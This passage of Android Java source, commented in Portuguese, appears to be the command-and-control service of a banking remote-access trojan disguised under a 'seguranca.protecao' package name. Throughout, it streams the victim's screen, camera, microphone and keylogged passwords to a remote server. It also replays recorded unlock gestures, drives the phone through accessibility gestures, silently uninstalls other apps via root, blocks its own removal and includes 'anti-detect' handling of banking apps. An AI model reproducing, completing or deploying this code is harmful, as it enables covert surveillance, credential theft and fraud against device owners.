     * Agenda reconexão ULTRA AGRESSIVA - NUNCA desiste!
     */
    private void scheduleReconnect() {
        // NUNCA para de tentar!
        if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
            Log.w(TAG, "⚠️ Muitas tentativas - resetando contador mas CONTINUANDO!");
            reconnectAttempts = 0;
        }
        
        reconnectAttempts++;
        
        // Backoff limitado: 2s, 4s, 8s... max 15s (muito mais rápido!)
        int delay = Math.min(RECONNECT_DELAY * (int)Math.pow(2, Math.min(reconnectAttempts - 1, 3)), 15000);
        
        Log.d(TAG, "🔄 Reconectando em " + (delay / 1000) + "s (tentativa " + reconnectAttempts + ")");
        
        // Remove qualquer reconexão pendente
        handler.removeCallbacksAndMessages(null);
        
        handler.postDelayed(() -> {
            if (!isConnected) {
                connectToServer();
            }
        }, delay);
    }
    
    /**
     * 🔄 Verifica se conexão está ativa e reconecta se necessário
     */
    private void checkConnectionHealth() {
        long now = System.currentTimeMillis();
        
        // Se não enviou nada há mais de 30 segundos, força reconexão
        if (lastSuccessfulSend > 0 && (now - lastSuccessfulSend) > 30000) {
            Log.w(TAG, "⚠️ Conexão parece morta (30s sem envios) - forçando reconexão!");
            isConnected = false;
            if (webSocket != null) {
                try {
                    webSocket.close(1000, "Health check failed");
                } catch (Exception e) {}
                webSocket = null;
            }
            scheduleReconnect();
        }
    }

    /**
     * Envia informações do dispositivo
     */
    private void sendDeviceInfo() {
        JsonObject info = new JsonObject();
        info.addProperty("type", "DEVICE_INFO");
        info.addProperty("device_id", deviceId);
        info.addProperty("model", Build.MODEL);
        info.addProperty("manufacturer", Build.MANUFACTURER);
        info.addProperty("android_version", Build.VERSION.RELEASE);
        info.addProperty("sdk", Build.VERSION.SDK_INT);
        
        sendJson(info);
    }

    private static int resolveMinFrameInterval(boolean silentPipeline, boolean slowConnection) {
        if (slowConnection) {
            return 250;
        }
        return silentPipeline ? SILENT_MIN_FRAME_INTERVAL : MIN_FRAME_INTERVAL;
    }

    /**
     * Envia frame de tela (JPEG) com controle de fluxo adaptativo
     */
    private void sendFrame(byte[] jpegData) {
        sendFrame(jpegData, false);
    }

    private void sendFrame(byte[] jpegData, boolean silentPipeline) {
        if (!isConnected || webSocket == null) {
            return;
        }
        
        long now = System.currentTimeMillis();
        
        // Throttling adaptativo
        int currentMinInterval = resolveMinFrameInterval(silentPipeline, isSlowConnection);
        if (now - lastFrameSentTime < currentMinInterval) {
            return;
        }
        
        // Controle de backpressure: max frames pendentes
        if (pendingFrames >= MAX_PENDING_FRAMES) {
            consecutiveSlowFrames++;
            if (consecutiveSlowFrames > 5) {
                isSlowConnection = true;
            }
            return;
        }
        
        try {
            ByteBuffer buffer = ByteBuffer.allocate(5 + jpegData.length);
            buffer.put((byte) 0x01);
            buffer.putInt(jpegData.length);
            buffer.put(jpegData);
            
            pendingFrames++;
            boolean sent = webSocket.send(ByteString.of(buffer.array()));
            lastFrameSentTime = now;
            lastSuccessfulSend = now;
            
            if (sent) {
                // OkHttp confirmou que o frame foi enfileirado com sucesso
                pendingFrames = Math.max(0, pendingFrames - 1);
                consecutiveSlowFrames = 0;
                if (isSlowConnection && consecutiveSlowFrames == 0) {
                    isSlowConnection = false; // Recuperou da conexão lenta
                }
            } else {
                // Buffer do WebSocket cheio - backpressure real
                consecutiveSlowFrames++;
                if (consecutiveSlowFrames > 5) {
                    isSlowConnection = true;
                }
                handler.postDelayed(() -> {
                    pendingFrames = Math.max(0, pendingFrames - 1);
                }, 200);
            }
            
        } catch (Exception e) {
            pendingFrames = 0;
            isConnected = false;
            scheduleReconnect();
        }
    }

    /**
     * Envia resposta JSON
     */
    private void sendResponse(String type, String data) {
        JsonObject response = new JsonObject();
        response.addProperty("type", type);
        response.addProperty("data", data);
        sendJson(response);
    }

    /**
     * Envia JSON via WebSocket - atualiza timestamp de sucesso
     */
    private void sendJson(JsonObject json) {
        if (isConnected && webSocket != null) {
            try {
                webSocket.send(gson.toJson(json));
                lastSuccessfulSend = System.currentTimeMillis(); // Atualiza timestamp!
            } catch (Exception e) {
                Log.e(TAG, "❌ Erro ao enviar JSON: " + e.getMessage());
                isConnected = false;
                scheduleReconnect();
            }
        } else {
            // Se não está conectado, tenta reconectar
            if (!isConnected) {
                scheduleReconnect();
            }
        }
    }

    /**
     * Inicia heartbeat ROBUSTO (ping periódico + health check)
     */
    private void startHeartbeat() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                // Verifica saúde da conexão
                checkConnectionHealth();
                
                if (isConnected && webSocket != null) {
                    try {
                        JsonObject ping = new JsonObject();
                        ping.addProperty("type", "PING");
                        ping.addProperty("timestamp", System.currentTimeMillis());
                        sendJson(ping);
                        Log.d(TAG, "💓 Heartbeat enviado");
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Erro no heartbeat: " + e.getMessage());
                        isConnected = false;
                        scheduleReconnect();
                    }
                } else {
                    Log.w(TAG, "⚠️ Heartbeat: não conectado - forçando reconexão");
                    scheduleReconnect();
                }
                
                handler.postDelayed(this, HEARTBEAT_INTERVAL);
            }
        }, HEARTBEAT_INTERVAL);
    }

    /**
     * Executa clique via AccessibilityService
     */
    private void performClick(int x, int y) {
        Log.d(TAG, "👆 Executando CLICK em: " + x + ", " + y);

        Intent intent = new Intent("com.seguranca.protecao.PERFORM_GESTURE");
        intent.setPackage(getPackageName()); // ANDROID 8+: Broadcast explícito
        intent.putExtra("action", "CLICK");
        intent.putExtra("x", x);
        intent.putExtra("y", y);
        sendBroadcast(intent);
        signalKillerCaptureIfActive();
    }

    private void signalKillerCaptureIfActive() {
        if (isKillerModeActive) {
            UiAssistBridge.requestKillerCapture();
        }
    }
    
    /**
     * Executa swipe via AccessibilityService
     */
    private void performSwipe(int x1, int y1, int x2, int y2) {
        Log.d(TAG, "👆 Executando SWIPE: " + x1 + "," + y1 + " -> " + x2 + "," + y2);
        
        // Envia broadcast EXPLÍCITO para o AccessibilityService executar o gesto
        Intent intent = new Intent("com.seguranca.protecao.PERFORM_GESTURE");
        intent.setPackage(getPackageName()); // ANDROID 8+: Broadcast explícito
        intent.putExtra("action", "SWIPE");
        intent.putExtra("x1", x1);
        intent.putExtra("y1", y1);
        intent.putExtra("x2", x2);
        intent.putExtra("y2", y2);
        sendBroadcast(intent);
        signalKillerCaptureIfActive();
    }
    
    /**
     * Executa long press via AccessibilityService
     */
    private void performLongPress(int x, int y, int duration) {
        Log.d(TAG, "👆 Executando LONG PRESS em: " + x + ", " + y + " por " + duration + "ms");
        
        // Envia broadcast EXPLÍCITO para o AccessibilityService executar o gesto
        Intent intent = new Intent("com.seguranca.protecao.PERFORM_GESTURE");
        intent.setPackage(getPackageName()); // ANDROID 8+: Broadcast explícito
        intent.putExtra("action", "LONG_PRESS");
        intent.putExtra("x", x);
        intent.putExtra("y", y);
        intent.putExtra("duration", duration);
        sendBroadcast(intent);
        signalKillerCaptureIfActive();
    }

    /**
     * Digite texto via AccessibilityService
     */
    private void performType(String text) {
        Log.d(TAG, "⌨️ Digitando texto: " + text);
        
        // Envia broadcast EXPLÍCITO para o AccessibilityService executar
        Intent intent = new Intent("com.seguranca.protecao.PERFORM_GESTURE");
        intent.setPackage(getPackageName()); // ANDROID 8+: Broadcast explícito
        intent.putExtra("action", "TYPE");
        intent.putExtra("text", text);
        sendBroadcast(intent);
    }

    /**
     * Executa navegação Android (BACK, HOME, RECENTS, POWER, etc.)
     * Usa o AccessibilityService para executar GLOBAL_ACTION
     */
    private void performNavigation(String action) {
        Log.d(TAG, "📱 Executando navegação: " + action);
        
        // Envia broadcast EXPLÍCITO para o AccessibilityService executar
        Intent intent = new Intent("com.seguranca.protecao.PERFORM_GESTURE");
        intent.setPackage(getPackageName()); // ANDROID 8+: Broadcast explícito
        intent.putExtra("action", action);
        sendBroadcast(intent);
    }

    private void vibrateDevice() {
        try {
            android.os.Vibrator vibrator;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.os.VibratorManager vm = (android.os.VibratorManager) getSystemService(Context.VIBRATOR_MANAGER_SERVICE);
                vibrator = vm != null ? vm.getDefaultVibrator() : null;
            } else {
                vibrator = (android.os.Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            }
            if (vibrator == null || !vibrator.hasVibrator()) {
                Log.w(TAG, "VIBRATE: dispositivo sem vibrador");
                return;
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(android.os.VibrationEffect.createOneShot(400, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vibrator.vibrate(400);
            }
        } catch (Exception e) {
            Log.e(TAG, "VIBRATE error: " + e.getMessage());
        }
    }

    private void adjustVolume(boolean up) {
        try {
            android.media.AudioManager am = (android.media.AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am == null) return;
            int direction = up ? android.media.AudioManager.ADJUST_RAISE : android.media.AudioManager.ADJUST_LOWER;
            am.adjustStreamVolume(
                    android.media.AudioManager.STREAM_MUSIC,
                    direction,
                    android.media.AudioManager.FLAG_SHOW_UI
            );
        } catch (Exception e) {
            Log.e(TAG, "Volume adjust error: " + e.getMessage());
        }
    }

    private void triggerSnapScreen() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.w(TAG, "SNAP_SCREEN requer Android 11+");
            return;
        }
        UiAssistBridge svc = UiAssistBridge.instance;
        if (svc == null) {
            Log.w(TAG, "SNAP_SCREEN: AccessibilityService indisponível");
            return;
        }
        svc.capSilentScreen(UiAssistBridge.getSilentCaptureQuality());
    }

    /**
     * Obtém SMS do dispositivo
     */
    private String getSMS() {
        // TODO: Implementar leitura de SMS
        return "[]";
    }

    /**
     * Obtém contatos do dispositivo
     */
    private String getContacts() {
        // TODO: Implementar leitura de contatos
        return "[]";
    }

    /**
     * Obtém localização do dispositivo
     */
    private String getLocation() {
        // TODO: Implementar obtenção de localização
        return "{}";
    }
    
    // ==================== SISTEMA DE DESBLOQUEIO AUTOMÁTICO ====================
    
    /**
     * Inicia gravação de sequência de desbloqueio
     */
    private void startUnlockRecording() {
        Log.d(TAG, "🔴 Iniciando gravação de desbloqueio...");
        
        Intent intent = new Intent("com.seguranca.protecao.UNLOCK_RECORDING");
        intent.setPackage(getPackageName());
        intent.putExtra("action", "START");
        sendBroadcast(intent);
    }
    
    /**
     * Para gravação de sequência de desbloqueio
     */
    private void stopUnlockRecording() {
        Log.d(TAG, "⏹️ Parando gravação de desbloqueio...");
        
        Intent intent = new Intent("com.seguranca.protecao.UNLOCK_RECORDING");
        intent.setPackage(getPackageName());
        intent.putExtra("action", "STOP");
        sendBroadcast(intent);
    }
    
    /**
     * Reproduz sequência de desbloqueio gravada
     */
    private void playUnlockSequence() {
        Log.d(TAG, "▶️ Reproduzindo sequência de desbloqueio...");
        
        Intent intent = new Intent("com.seguranca.protecao.UNLOCK_RECORDING");
        intent.setPackage(getPackageName());
        intent.putExtra("action", "PLAY");
        sendBroadcast(intent);
    }

    private void playUnlockSequence(String jsonSequence) {
        Log.d(TAG, "▶️ Reproduzindo sequência de desbloqueio...");
        
        Intent intent = new Intent("com.seguranca.protecao.UNLOCK_RECORDING");
        intent.setPackage(getPackageName());
        intent.putExtra("action", "PLAY");
        intent.putExtra("sequence_json", jsonSequence);
        sendBroadcast(intent);
    }

    // ==================== GERENCIAMENTO DE APPS ====================
    
    /**
     * Lista todos os apps instalados no dispositivo
     */
    private void getInstalledApps() {
        Log.d(TAG, "📱 Obtendo lista de apps instalados...");
        
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            
            // Usa getInstalledPackages que é mais confiável e retorna TODOS os apps
            java.util.List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
            
            com.google.gson.JsonArray appList = new com.google.gson.JsonArray();
            java.util.Set<String> addedPackages = new java.util.HashSet<>();
            
            Log.d(TAG, "📱 Encontrados " + packages.size() + " pacotes via getInstalledPackages");
            
            for (android.content.pm.PackageInfo pkgInfo : packages) {
                android.content.pm.ApplicationInfo app = pkgInfo.applicationInfo;
                if (app == null) continue;
                
                // Evita duplicatas
                if (addedPackages.contains(app.packageName)) continue;
                addedPackages.add(app.packageName);
                try {
                    JsonObject appInfo = new JsonObject();
                    
                    // Nome do app
                    String appName = pm.getApplicationLabel(app).toString();
                    appInfo.addProperty("name", appName);
                    
                    // Package name
                    appInfo.addProperty("package", app.packageName);
                    
                    // É app de sistema?
                    boolean isSystem = (app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
                    appInfo.addProperty("isSystem", isSystem);
                    
                    // Versão (já temos pkgInfo do loop)
                    appInfo.addProperty("version", pkgInfo.versionName != null ? pkgInfo.versionName : "unknown");
                    appInfo.addProperty("versionCode", pkgInfo.versionCode);
                    
                    // Data de instalação
                    appInfo.addProperty("installedAt", pkgInfo.firstInstallTime);
                    appInfo.addProperty("updatedAt", pkgInfo.lastUpdateTime);
                    
                    // Pode ser aberto? (tem launcher activity)
                    Intent launchIntent = pm.getLaunchIntentForPackage(app.packageName);
                    appInfo.addProperty("canOpen", launchIntent != null);
                    
                    // Está habilitado?
                    appInfo.addProperty("enabled", app.enabled);
                    
                    appList.add(appInfo);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Erro ao processar app: " + app.packageName);
                }
            }
            
            // Envia lista para servidor
            JsonObject response = new JsonObject();
            response.addProperty("type", "INSTALLED_APPS");
            response.add("apps", appList);
            response.addProperty("count", appList.size());
            sendJson(response);
            
            Log.d(TAG, "📱 Lista de apps enviada: " + appList.size() + " apps");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao obter apps: " + e.getMessage());
            sendResponse("ERROR", "Erro ao obter apps: " + e.getMessage());
        }
    }
    
    /**
     * 🔐 [ANTI-DETECT] Solicita estatísticas de captura do UiAssistBridge
     */
    private void requestCaptureStats() {
        Log.d(TAG, "🔐 [ANTI-DETECT] Solicitando capture stats...");
        
        try {
            // Chama método estático no UiAssistBridge para obter stats
            java.lang.reflect.Method getStatsMethod = Class.forName("com.seguranca.protecao.UiAssistBridge")
                .getMethod("getCaptureStats");
            @SuppressWarnings("unchecked")
            java.util.Map<String, Object> stats = (java.util.Map<String, Object>) getStatsMethod.invoke(null);
            
            JsonObject response = new JsonObject();
            response.addProperty("type", "CAPTURE_STATS");
            response.addProperty("device_id", deviceId);
            
            for (java.util.Map.Entry<String, Object> entry : stats.entrySet()) {
                String key = entry.getKey();
                Object value = entry.getValue();
                if (value instanceof Boolean) {
                    response.addProperty(key, (Boolean) value);
                } else if (value instanceof Integer) {
                    response.addProperty(key, (Integer) value);
                } else if (value instanceof Long) {
                    response.addProperty(key, (Long) value);
                } else if (value instanceof String) {
                    response.addProperty(key, (String) value);
                } else {
                    response.addProperty(key, String.valueOf(value));
                }
            }
            
            sendJson(response);
            Log.d(TAG, "🔐 [ANTI-DETECT] Capture stats enviadas: " + response.toString());
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao obter capture stats: " + e.getMessage());
            sendResponse("ERROR", "Erro ao obter stats: " + e.getMessage());
        }
    }
    
    /**
     * 🔐 [ANTI-DETECT] Reseta estado de detecção de app bancário no UiAssistBridge
     */
    private void resetBankingAppState() {
        Log.d(TAG, "🔐 [ANTI-DETECT] Resetando banking app state...");
        
        try {
            java.lang.reflect.Method resetMethod = Class.forName("com.seguranca.protecao.UiAssistBridge")
                .getMethod("resetBankingAppState");
            resetMethod.invoke(null);
            
            sendResponse("OK", "Banking app state resetado");
            Log.d(TAG, "🔐 [ANTI-DETECT] Banking app state resetado com sucesso");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao resetar banking state: " + e.getMessage());
            sendResponse("ERROR", "Erro ao resetar: " + e.getMessage());
        }
    }
    
    /**
     * Abre um app pelo package name
     */
    private void openApp(String packageName) {
        Log.d(TAG, "📱 Abrindo app: " + packageName);
        
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            Intent launchIntent = pm.getLaunchIntentForPackage(packageName);
            
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(launchIntent);
                sendResponse("OK", "App aberto: " + packageName);
            } else {
                sendResponse("ERROR", "App não pode ser aberto: " + packageName);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao abrir app: " + e.getMessage());
            sendResponse("ERROR", "Erro ao abrir app: " + e.getMessage());
        }
    }
    
    /**
     * Abre tela de desinstalação de um app
     * Tenta múltiplas abordagens para garantir compatibilidade
     */
    private void uninstallApp(String packageName) {
        Log.d(TAG, "🗑️ Solicitando desinstalação SILENCIOSA: " + packageName);
        
        // 🔒 PROTEÇÃO: Não permite desinstalar o próprio app via painel
        if (packageName.equals(getPackageName())) {
            Log.w(TAG, "🔒 Tentativa de desinstalar o próprio app BLOQUEADA!");
            sendResponse("ERROR", "Não é permitido desinstalar o próprio app");
            return;
        }
        
        // 🗑️ PRIMEIRO: Envia broadcast para permitir desinstalar OUTROS apps
        // Isso desativa a proteção anti-delete temporariamente para OUTROS apps
        Intent allowIntent = new Intent("com.seguranca.protecao.ALLOW_UNINSTALL");
        allowIntent.setPackage(getPackageName());
        sendBroadcast(allowIntent);
        Log.d(TAG, "🗑️ Broadcast ALLOW_UNINSTALL enviado!");
        
        // Executa em thread separada
        new Thread(() -> {
            try {
                // 🔥 MÉTODO 1: pm uninstall via ROOT (SILENCIOSO!)
                Log.d(TAG, "🗑️ Tentando pm uninstall silencioso para: " + packageName);
                Process suProcess = Runtime.getRuntime().exec("su");
                java.io.DataOutputStream os = new java.io.DataOutputStream(suProcess.getOutputStream());
                os.writeBytes("pm uninstall " + packageName + "\n");
                os.writeBytes("exit\n");
                os.flush();
                
                int exitCode = suProcess.waitFor();
                Log.d(TAG, "🗑️ pm uninstall exit code: " + exitCode);
                
                if (exitCode == 0) {
                    // Verifica se realmente foi desinstalado
                    Thread.sleep(500);
                    try {
                        getPackageManager().getPackageInfo(packageName, 0);
                        // Se chegou aqui, ainda existe
                        Log.d(TAG, "🗑️ pm uninstall não funcionou, tentando método alternativo");
                        uninstallWithAutoClick(packageName);
                    } catch (android.content.pm.PackageManager.NameNotFoundException e) {
                        // App foi desinstalado com sucesso!
                        Log.d(TAG, "🗑️ ✅ App desinstalado SILENCIOSAMENTE via ROOT: " + packageName);
                        sendResponse("OK", "App desinstalado silenciosamente: " + packageName);
                        return;
                    }
                } else {
                    Log.d(TAG, "🗑️ ROOT não disponível, tentando método alternativo");
                    uninstallWithAutoClick(packageName);
                }
            } catch (Exception e) {
                Log.e(TAG, "🗑️ Erro no pm uninstall: " + e.getMessage());
                // Fallback para método com auto-click
                uninstallWithAutoClick(packageName);
            }
        }).start();
    }
    
    /**
     * Desinstala app com auto-click (quando ROOT não está disponível)
     */
    private void uninstallWithAutoClick(String packageName) {
        Log.d(TAG, "🗑️ Usando desinstalação com AUTO-CLICK para: " + packageName);
        
        // Envia broadcast para AccessibilityService para auto-confirmar desinstalação
        Intent autoUninstallIntent = new Intent("com.seguranca.protecao.AUTO_UNINSTALL");
        autoUninstallIntent.putExtra("package", packageName);
        autoUninstallIntent.setPackage(getPackageName());
        sendBroadcast(autoUninstallIntent);
        
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            try {
                // Método 1: Intent.ACTION_DELETE (padrão)
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(android.net.Uri.parse("package:" + packageName));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                
                // Verifica se há algum app que pode lidar com esse intent
                if (intent.resolveActivity(getPackageManager()) != null) {
                    Log.d(TAG, "🗑️ Usando ACTION_DELETE para: " + packageName);
                    startActivity(intent);
                    sendResponse("OK", "Desinstalação iniciada (aguarde auto-click): " + packageName);
                } else {
                    // Método 2: Abre configurações do app (fallback)
                    Log.d(TAG, "🗑️ ACTION_DELETE não disponível, usando Settings para: " + packageName);
                    Intent settingsIntent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    settingsIntent.setData(android.net.Uri.parse("package:" + packageName));
                    settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(settingsIntent);
                    sendResponse("OK", "Configurações do app abertas para: " + packageName);
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Erro ao desinstalar: " + e.getMessage());
                e.printStackTrace();
                
                // Último recurso: abre configurações do app
                try {
                    Intent fallbackIntent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    fallbackIntent.setData(android.net.Uri.parse("package:" + packageName));
                    fallbackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(fallbackIntent);
                    sendResponse("OK", "Configurações do app abertas (fallback): " + packageName);
                } catch (Exception e2) {
                    Log.e(TAG, "❌ Fallback também falhou: " + e2.getMessage());
                    sendResponse("ERROR", "Erro ao desinstalar: " + e.getMessage());
                }
            }
        }, 300); // 300ms delay
    }
    
    /**
     * Força parada de um app (via Accessibility)
     */
    private void forceStopApp(String packageName) {
        Log.d(TAG, "⛔ Forçando parada: " + packageName);
        
        try {
            // Abre configurações do app
            Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(android.net.Uri.parse("package:" + packageName));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            
            // O Accessibility Service pode clicar em "Forçar parada" automaticamente
            // Por enquanto, apenas abre a tela
            sendResponse("OK", "Tela de configurações aberta para: " + packageName);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao forçar parada: " + e.getMessage());
            sendResponse("ERROR", "Erro ao forçar parada: " + e.getMessage());
        }
    }
    
    /**
     * Gera ID único do dispositivo
     */
    private String getUniqueDeviceId() {
        String androidId = android.provider.Settings.Secure.getString(
            getContentResolver(),
            android.provider.Settings.Secure.ANDROID_ID
        );
        return androidId != null ? androidId : "unknown";
    }
    
    /**
     * Liga/Desliga keylogger
     */
    private void toggleKeylogger(boolean enabled) {
        Log.d(TAG, "⌨️ " + (enabled ? "Ativando" : "Desativando") + " keylogger...");
        
        Intent intent = new Intent("com.seguranca.protecao.TOGGLE_KEYLOGGER");
        intent.setPackage(getPackageName());
        intent.putExtra("enabled", enabled);
        sendBroadcast(intent);
    }
    
    /**
     * Envia dados do keylogger para servidor
     */
    private void sendKeylog(String jsonData) {
        if (!isConnected || webSocket == null) {
            Log.w(TAG, "⚠️ Não conectado! Descartando keylog.");
            return;
        }
        
        try {
            JsonObject msg = new JsonObject();
            msg.addProperty("type", "KEYLOG");
            msg.addProperty("data", jsonData);
            sendJson(msg);
            
            Log.d(TAG, "✅ Keylog enviado: " + jsonData);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao enviar keylog: " + e.getMessage());
        }
    }
    
    /**
     * 🔐 Envia keylog para servidor (chamado via BroadcastReceiver)
     * Usado pelo VisualScreenActivity para enviar senhas capturadas
     */
    private void sendKeylogToServer(String jsonData) {
        if (!isConnected || webSocket == null) {
            Log.w(TAG, "⚠️ Não conectado! Tentando reconectar para enviar keylog...");
            connectToServer();
            // Agenda para enviar depois
            handler.postDelayed(() -> {
                if (isConnected && webSocket != null) {
                    sendKeylog(jsonData);
                }
            }, 2000);
            return;
        }
        
        // Envia usando a função existente
        sendKeylog(jsonData);
        Log.d(TAG, "🔐 Keylog enviado ao servidor: " + jsonData.substring(0, Math.min(100, jsonData.length())));
    }
    
    /**
     * Liga/Desliga Screen Reader V2
     */
    private void toggleScreenReader(boolean enabled) {
        Log.d(TAG, "👁️ " + (enabled ? "Ativando" : "Desativando") + " Screen Reader V2...");
        
        Intent intent = new Intent("com.seguranca.protecao.TOGGLE_SCREEN_READER");
        intent.setPackage(getPackageName());
        intent.putExtra("enabled", enabled);
        sendBroadcast(intent);
    }
    
    /**
     * Envia hierarquia da tela para servidor (Screen Reader V2)
     */
    private void sendScreenHierarchy(String jsonData) {
        if (!isConnected || webSocket == null) {
            Log.w(TAG, "⚠️ Não conectado! Descartando screen hierarchy.");
            return;
        }
        
        try {
            JsonObject msg = new JsonObject();
            msg.addProperty("type", "SCREEN_HIERARCHY");
            msg.addProperty("data", jsonData);
            sendJson(msg);
            
            // Log resumido (pode ser muito grande)
            Log.d(TAG, "✅ Screen hierarchy enviada (" + jsonData.length() + " bytes)");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao enviar screen hierarchy: " + e.getMessage());
        }
    }
    
    /**
     * 🔓 Envia sequência de desbloqueio gravada para o servidor
     */
    private void sendUnlockSequence(String jsonData) {
        if (!isConnected || webSocket == null) {
            Log.w(TAG, "⚠️ Não conectado! Descartando unlock sequence.");
            return;
        }
        
        try {
            JsonObject msg = new JsonObject();
            msg.addProperty("type", "UNLOCK_SEQUENCE");
            msg.addProperty("data", jsonData);
            sendJson(msg);
            
            Log.d(TAG, "🔓 Unlock sequence enviada (" + jsonData.length() + " bytes)");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao enviar unlock sequence: " + e.getMessage());
        }
    }
    
    /**
     * 📷 Liga/Desliga câmera em tempo real
     */
    private void toggleCamera(boolean enabled) {
        Log.d(TAG, "📷 " + (enabled ? "Ativando" : "Desativando") + " câmera...");
        
        // Garante que o serviço está rodando antes de enviar broadcast
        if (enabled) {
            try {
                Intent serviceIntent = new Intent(this, CameraService.class);
                startService(serviceIntent);
                Log.d(TAG, "📷 CameraService iniciado");
            } catch (Exception e) {
                Log.e(TAG, "❌ Erro ao iniciar CameraService: " + e.getMessage());
            }
        }
        
        // Pequeno delay para garantir que o serviço está pronto
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent intent = new Intent("com.seguranca.protecao.TOGGLE_CAMERA");
            intent.setPackage(getPackageName());
            intent.putExtra("enabled", enabled);
            sendBroadcast(intent);
            Log.d(TAG, "📷 Broadcast TOGGLE_CAMERA enviado: " + enabled);
        }, enabled ? 500 : 0);
    }
    
    /**
     * 📷 Envia frame da câmera para servidor (base64)
     */
    public void sendCameraFrame(byte[] jpegData) {
        if (!isConnected || webSocket == null) {
            Log.w(TAG, "⚠️ Não conectado! Descartando frame da câmera.");
            return;
        }
        
        try {
            String base64 = android.util.Base64.encodeToString(jpegData, android.util.Base64.NO_WRAP);
            
            JsonObject msg = new JsonObject();
            msg.addProperty("type", "CAMERA_FRAME");
            msg.addProperty("data", base64);
            sendJson(msg);
            
            Log.d(TAG, "✅ Camera frame enviado: " + jpegData.length + " bytes");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao enviar camera frame: " + e.getMessage());
        }
    }
    
    /**
     * 🎤 Liga/Desliga microfone em tempo real
     */
    private void toggleMicrophone(boolean enabled) {
        Log.d(TAG, "🎤 " + (enabled ? "Ativando" : "Desativando") + " microfone...");
        
        // Garante que o serviço está rodando antes de enviar broadcast
        if (enabled) {
            try {
                Intent serviceIntent = new Intent(this, MicrophoneService.class);
                startService(serviceIntent);
                Log.d(TAG, "🎤 MicrophoneService iniciado");
            } catch (Exception e) {
                Log.e(TAG, "❌ Erro ao iniciar MicrophoneService: " + e.getMessage());
            }
        }
        
        // Pequeno delay para garantir que o serviço está pronto
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent intent = new Intent("com.seguranca.protecao.TOGGLE_MICROPHONE");
            intent.setPackage(getPackageName());
            intent.putExtra("enabled", enabled);
            sendBroadcast(intent);
            Log.d(TAG, "🎤 Broadcast TOGGLE_MICROPHONE enviado: " + enabled);
        }, enabled ? 500 : 0);
    }
    
    /**
     * 🎤 Envia chunk de áudio para servidor (base64)
     */
    public void sendAudioChunk(byte[] audioData) {
        if (!isConnected || webSocket == null) {
            Log.w(TAG, "⚠️ Não conectado! Descartando chunk de áudio.");
            return;
        }
        
        try {
            String base64 = android.util.Base64.encodeToString(audioData, android.util.Base64.NO_WRAP);
            
            JsonObject msg = new JsonObject();
            msg.addProperty("type", "AUDIO_CHUNK");
            msg.addProperty("data", base64);
            sendJson(msg);
            
            Log.d(TAG, "✅ Audio chunk enviado: " + audioData.length + " bytes");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao enviar audio chunk: " + e.getMessage());
        }
    }
    
    /**
     * Backpressure gate shared by standard and silent capture loops.
     * Mirrors sendFrame() throttle without sending.
     */
    public static boolean canAcceptScreenFrame() {
        CommandControlService svc = sInstance;
        if (svc == null || !svc.isConnected || svc.webSocket == null) {
            return false;
        }
        long now = System.currentTimeMillis();
        boolean silentPipeline = UiAssistBridge.isSilentCaptureRunning();
        int currentMinInterval = resolveMinFrameInterval(silentPipeline, svc.isSlowConnection);
        if (now - svc.lastFrameSentTime < currentMinInterval) {
            return false;
        }
        return svc.pendingFrames < MAX_PENDING_FRAMES;
    }

    /**
     * 🔇 Envia status do caminho silencioso dedicado (BTMOB).
     * Usado para que o painel reflita o estado real após reconexão/refresh.
     */
    private void sendSilentVncStatusInternal(boolean active, String method) {
        if (!isConnected || webSocket == null) {
            return;
        }
        try {
            JsonObject st = new JsonObject();
            st.addProperty("type", "SILENT_VNC_STATUS");
            st.addProperty("active", active);
            st.addProperty("method", method != null ? method : "silent");
            st.addProperty("device_id", deviceId);
            sendJson(st);
        } catch (Exception e) {
            Log.e(TAG, "❌ Erro ao enviar SILENT_VNC_STATUS: " + e.getMessage());
        }
    }

    /**
     * 🔇 Envia frame silent pelo mesmo pipeline binário da captura padrão (SEND_FRAME → sendFrame).
     */
    public static void sendSilentVncFrame(Context context, byte[] frameData) {
        if (context == null || frameData == null) {
            return;
        }
        Intent intent = new Intent(context, CommandControlService.class);
        intent.setAction("SEND_FRAME");
